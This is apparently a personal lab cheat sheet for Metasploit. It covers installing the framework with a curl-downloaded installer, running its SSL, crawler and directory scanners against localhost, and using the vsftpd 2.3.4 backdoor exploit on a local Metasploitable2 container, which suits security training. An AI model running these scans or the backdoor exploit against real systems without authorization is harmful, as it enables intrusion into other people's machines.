# Metasploit

## Installation

https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```

* https://owasp.org/Top10/2025/
    * A01:2025 - Broken Access Control
    * A05:2025 - Injection

## Usage

### Information Gathering -- Scanner

```bash
search path:auxiliary/scanner ssl
# search type:auxiliary tls -S scanner
use auxiliary/scanner/ssl/ssl_version
options
set RHOSTS localhost
set RPORT 5005
set VERBOSE 1
set ConnectTimeout 20
run
```

```bash
use auxiliary/scanner/http/crawler
set RHOSTS localhost
set RPORT 5005
set SSL false
run
```

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS localhost
set RPORT 5005
set SSL false
run
```
* bigger wordlists at https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

### Alternatives

* nmap
* gobuster/ffuf
* sqlmap

## SQL Injection

## Access Control

## Exploits

```bash
docker run -d --net=host --name metasploitable2 tleemcjr/metasploitable2 /bin/bash -c "/bin/services.sh && tail -f /dev/null"
```

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 127.0.0.1
set RPORT 21
set LHOST localhost
run
```
